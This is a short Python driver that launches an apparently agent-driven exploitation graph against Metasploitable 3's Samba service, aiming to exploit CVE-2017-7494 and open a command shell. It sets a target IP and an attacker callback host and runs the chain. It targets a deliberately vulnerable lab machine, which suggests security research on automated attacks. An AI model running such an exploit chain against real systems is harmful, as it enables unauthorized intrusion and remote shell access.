"""
Live test driver for examples/samba_pipename_graph.py.

Unauthenticated SMB exploitation chain against Metasploitable 3's
Samba on port 445 (CVE-2017-7494 is_known_pipename). Expected to land
a command shell via a writable share.
"""

from __future__ import annotations
import os

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.orchestrator import run_graph
from examples.samba_pipename_graph import build_samba_pipename_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = os.getenv("LHOST", "192.168.34.1")

if __name__ == "__main__":
    graph = build_samba_pipename_graph(target_ip=TARGET_IP, attacker_ip=ATTACKER_IP)
    print(f"Loaded graph: {graph.name}  ({len(graph.nodes)} nodes, {len(graph.edges)} edges)")
    print(f"Running with explore=True, use_judge=True against {TARGET_IP}...")
    run_graph(graph, explore=True, use_judge=True)
